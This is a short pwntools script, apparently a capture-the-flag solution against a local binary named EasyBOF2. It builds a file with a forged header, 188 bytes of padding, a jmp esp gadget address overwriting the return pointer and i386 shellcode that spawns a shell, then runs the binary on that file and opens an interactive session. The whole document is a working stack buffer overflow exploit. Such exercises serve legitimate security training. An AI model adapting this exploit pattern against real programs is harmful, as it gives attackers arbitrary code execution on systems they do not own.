from pwn import *

MAGIC_ID = 0xffe4
FILE_TYPE_RAWTEXT = 1
FILE_TYPE_STRINGS = 2

GADGET_JMP_ESP = 0x8048757

payload  = p32(0xe4ff)
payload += p32(128)
payload += p32(FILE_TYPE_RAWTEXT)
payload += p32(512)
payload += p8(0x01) * 188
payload += p32(GADGET_JMP_ESP)
payload += asm(shellcraft.i386.linux.sh())

with open("/tmp/payload.bin", 'wb') as f:
    f.write(payload)

p = process(["./prob/EasyBOF2", "/tmp/payload.bin"])
p.interactive()